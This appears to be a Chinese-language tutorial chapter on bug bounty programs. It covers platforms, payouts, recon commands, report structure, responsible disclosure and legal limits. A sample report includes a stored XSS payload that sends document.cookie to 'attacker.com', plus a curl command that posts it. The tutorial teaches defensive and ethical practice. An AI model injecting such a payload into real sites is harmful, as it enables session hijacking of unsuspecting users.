# Ch 26 — Bug bounty 心法 + responsible disclosure

> 目標：理解 bug bounty 程式怎麼運作、怎麼參與、怎麼寫 report、法律邊界。

## Bug bounty 是什麼

「**公司付錢給 ethical hacker 找漏洞**」。

雙贏：

- 公司：低成本 pentest，比簽合約便宜
- hacker：合法練 + 賺錢
- user：產品更安全

主流平台：

- **HackerOne** — 最大
- **Bugcrowd**
- **Intigriti** (歐洲)
- **YesWeHack** (歐洲)
- **Synack** (邀請制)

各公司也自家 bug bounty (Apple / Google / Microsoft / Meta)。

## 賞金範圍

| Severity | 範圍 |
|---|---|
| Critical (RCE / 帳號 takeover / mass data leak) | $1K - $50K |
| High (SQL injection / XSS in admin / SSRF) | $500 - $10K |
| Medium (IDOR / open redirect) | $100 - $2K |
| Low (info disclosure / weak crypto) | $50 - $500 |

頂級 program：

- Apple iOS RCE: 最高 $1M
- Google Pixel: $1M
- Microsoft Hyper-V: $250K

「**全職 bug hunter**」存在 — 能年收 $100K-$500K。但**極競爭**。

## 怎麼開始

### 1. 練功（你已在做）

- OWASP Top 10 熟
- Burp / sqlmap / nuclei 熟
- Juice Shop / DVWA / 靶機（HackTheBox / TryHackMe）
- PortSwigger Academy

### 2. 看 disclosed reports

https://hackerone.com/hacktivity 篩 "Disclosed"

看別人怎麼找漏洞 + 寫 report。**最佳老師**。

### 3. 選 program

挑：

- 大 scope (subdomain wildcards)
- 高賞金
- 快 response (< 7 天)
- public（new hunter 不能加 private）
- 你熟的 tech stack

避免：

- "Hall of Fame only" (沒錢)
- 1 年沒新 report 的（program dead）
- "managed" program (managed pentester 先掃過)

### 4. Recon 階段（占 50% 時間）

```bash
# subdomain
subfinder -d target.com
amass enum -d target.com

# 找 hidden endpoint
gau target.com    # GetAllUrls
waybackurls target.com
ffuf -u 'https://FUZZ.target.com' -w subdomains.txt

# 看 git / public source
github.com / 搜 "target.com api_key"

# JS 中找 secret / endpoint
linkfinder + js files

# Tech stack
whatweb https://target.com
wappalyzer (browser ext)
```

更深 recon = 更多獨家 finding。

### 5. 攻擊階段

對找到 endpoint 跑 OWASP Top 10：

- BOLA / IDOR
- SSRF
- SQL injection
- XSS
- Logic flaw

「**OWASP Top 10 找完一遍**」是 baseline。

## 寫好 report 的技巧

公司 triager 1 天看 100 份 report → 你 report 必須 5 秒內傳達 impact。

### 結構

```markdown
# Title (clear, 含 vulnerability + endpoint)

## Summary
1-2 句話：什麼 vulnerability，什麼 impact。

## Severity
你建議的 severity + CVSS score。

## Steps to Reproduce
詳細 step。每步都該能重現。
含 screenshot / video。

## Proof of Concept
完整 payload / curl command / script。
含 截圖。

## Impact
具體：能讀 X 用戶資料 / 能改 Y / 能 RCE...
量化：影響多少 user / 多少資料 / etc.

## Suggested Fix
你建議怎麼修。
顯示你不只會攻還會 defend。

## References
相關 CVE / OWASP / 文章。
```

### 範例 (好 vs 壞)

**爛**：

```
我發現你 site 有 XSS。
URL 是 https://target.com/search?q=<script>alert(1)</script>。
請修。
```

triager 拒，因為：

- 沒說 severity
- 沒詳細 step
- 沒 impact
- 看起來像 1 分鐘 copy-paste

**好**：

```
# Stored XSS in user comment field allows session hijacking

## Summary
The /api/comments endpoint does not sanitize user input before storing.
This allows stored XSS that fires for any user viewing the comment thread,
leading to session hijacking via document.cookie theft.

## Severity
Critical (CVSS 8.8)
- Network attack vector
- Low complexity
- Low privileges (any user can comment)
- High C/I/A impact

## Reproduction
1. Login as any user
2. POST /api/comments with body:
   {"text": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"}
3. Any user opening the thread will execute the script

## PoC
[screenshot of comment + alert popup + intercepted cookie]

```bash
# Attack
curl -X POST https://target.com/api/comments \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"text": "<script>...</script>"}'

# Result: any user viewing /thread/123 will leak cookie to attacker.com
```

## Impact
- Account takeover for any user viewing affected thread
- Affected: 100% of authenticated users
- Persistent: payload stored in DB

## Suggested Fix
1. Server-side: HTML escape comment text before storing OR before rendering
   - Use DOMPurify (Node) or bleach (Python)
2. CSP: add `script-src 'self' 'nonce-XXX'` to prevent inline script
3. Cookie: add `HttpOnly` flag to prevent JS access

## References
- OWASP XSS Prevention Cheat Sheet
- CWE-79
```

triager 30 秒看完，立刻知道嚴重度、能重現、修法明確 → 接受 + 高賞金。

## Bug bounty 心法

### 1. Recon 是關鍵

90% bug 在「**冷門 endpoint / 老 subdomain / acquired company**」。

- 做完整 subdomain enum
- 找 acquired company（M&A 整合差）
- old API version (`/api/v1/`)
- 看 wayback machine

### 2. 自動化重複工作

寫 script 自動掃新 subdomain / 新 endpoint：

```bash
# 每天掃
crontab -e
0 8 * * * subfinder -d target.com -o today.txt && diff yesterday.txt today.txt
```

新 subdomain → 立刻測。

### 3. 找熟的 vulnerable pattern

每個人有「**自己擅長**」的：

- 你擅長 SSRF？專注找接受 URL 的 endpoint
- 擅長 SQL injection？專注 search / report 功能
- 擅長 logic flaw？專注 payment / coupon

### 4. 不重複別人

熱門 site 可能 50+ hunter 在掃 → 你晚了。挑：

- 新 launch 的 program
- 大公司新 acquisition
- 上週 launch 的 feature（公告 → 立刻看）

### 5. 不要灰色

**只在 scope 內**。out-of-scope 攻擊：

- 違法
- ban 你
- 律師信

每個 program 有 scope page，仔細讀。

## Responsible disclosure（沒 bounty 怎麼辦）

公司沒 bug bounty，但你發現漏洞，怎辦？

### 1. 找 contact

```bash
curl https://target.com/security.txt
curl https://target.com/.well-known/security.txt
```

`security.txt` 是標準（RFC 9116），含 contact / encryption key。

或：

- Email `security@`, `secure@`
- LinkedIn 找 CISO / Security team
- Twitter DM

### 2. Initial contact

寄 email：

```
Subject: Security vulnerability disclosure - [Brief title]

Hi,

I've discovered a security vulnerability in your application.
I would like to report it responsibly.

Could you confirm:
- Is there a security disclosure process?
- Is there a PGP key for sensitive details?

Please respond within 7 days, otherwise I will follow up.

Thanks,
[Your name]
```

**不要在第一封信附 PoC**。等 acknowledge 才送詳細。

### 3. 如果不回

```
- 7 天 → 第 2 封 follow-up
- 14 天 → 第 3 封 + CC CEO / Comms
- 30 天 → CERT / regulator
- 90 天 (Project Zero standard) → 公開 disclosure (你自己決定)
```

但**法律風險**！未經授權的 disclosure 可能被告。慎重 + 可能找律師諮詢。

### 4. 不接受灰色行為

「**找漏洞不告知，再 sell 給壞人**」 → grey market / illegal。

「**勒索**」("付我錢不然我公開") → criminal extortion。

ethical hacker = follow disclosure standard，不為金錢妥協 ethics。

## 一個常見誤解：「bug bounty 容易賺」

**錯**。實情：

- 90% 提交是 dup / out-of-scope / 假 finding
- 大部分 hunter 一年賺不到 $1K
- 全職 hunter 是 top 1%
- 競爭激烈

但**學習**價值極高 — 即使沒賺到錢，學到的 skill 受用一輩子。

## 一個常見誤解：「我可以幫家人 / 朋友 site 找漏洞」

**部分對**。**口頭授權不夠**。書面 written authorization 才合法。

「**幫朋友看看**」沒 written 授權 = 違法。

## 一個常見誤解：「我能 anonymous 報告」

**部分對**。HackerOne / Bugcrowd 允許 alias。但：

- 收賞金需要 verify identity (KYC)
- 完全 anonymous 通常不接受

## 動手練習

**1. 註冊 HackerOne**

https://hackerone.com 註冊。完成 onboarding。

**2. 看 disclosed reports**

挑 5 個 disclosed report 讀完：

- 攻擊鏈
- 怎麼找的（recon 過程）
- 報告寫得好嗎

**3. 找 1 個 program 來練**

挑 public + 大 scope program（如 Shopify / GitHub / Mail.ru）。

**不要急著 submit**，先 recon + 學熟 site。

**4. 寫個 report draft**

對 Juice Shop 你完成的 challenge，寫成「假設這是 bounty」格式 report。

**5. security.txt 自己寫**

對自己 site 寫 security.txt：

```
Contact: mailto:security@yourdomain.com
Expires: 2026-01-01T00:00:00Z
Encryption: https://yourdomain.com/pgp-key.txt
Acknowledgments: https://yourdomain.com/hall-of-fame
Preferred-Languages: en, zh-Hant
Canonical: https://yourdomain.com/.well-known/security.txt
```

放 `/.well-known/security.txt`。

## 自我檢核

- [ ] 知道 HackerOne / Bugcrowd 等平台
- [ ] 賞金範圍對 severity 概念
- [ ] Bug bounty 5 步流程（練功 / 看 reports / 選 / recon / 攻 / report）
- [ ] 寫得出好 report（含 5 段結構）
- [ ] Responsible disclosure 流程
- [ ] 知道法律邊界（scope only）

下一章看紅藍隊演習方法論。

→ [Ch 27 紅藍隊演習方法論](./27-red-blue-team.md)
